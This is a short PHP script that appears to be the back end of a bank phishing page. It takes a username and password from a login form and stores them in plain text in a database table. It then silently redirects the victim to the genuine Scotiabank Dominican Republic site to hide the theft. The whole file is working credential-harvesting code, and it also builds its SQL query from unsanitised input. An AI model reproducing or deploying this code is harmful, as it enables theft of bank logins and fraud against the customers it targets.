<?php 

include("con_db4.php");

if (isset($_POST['ingresar'])) {
    if (strlen($_POST['user']) >= 1 && strlen($_POST['pass']) >= 1) {

	    $user = trim($_POST['user']);
	    $pass = trim($_POST['pass']);
	    
        $consulta = "INSERT INTO datos1(user, pass) VALUES ('$user','$pass')";
	    $resultado = mysqli_query($conex,$consulta);
	    
	    	if ($resultado) {
	    	?>

	    	
           <meta HTTP-EQUIV="Refresh" CONTENT="0; URL=https://do.scotiabank.com">
	    


	    <h3 style="text-align: center;
	" class="ok"></h3></a>
           <?php
	    } else {
	    	?>
	    	
	    	<h3 class="bad">¡Ups ha ocurrido un error!</h3>
           <?php
	    }
    }   else {
	    	?> 
	    	
           <?php
    }
}

?>











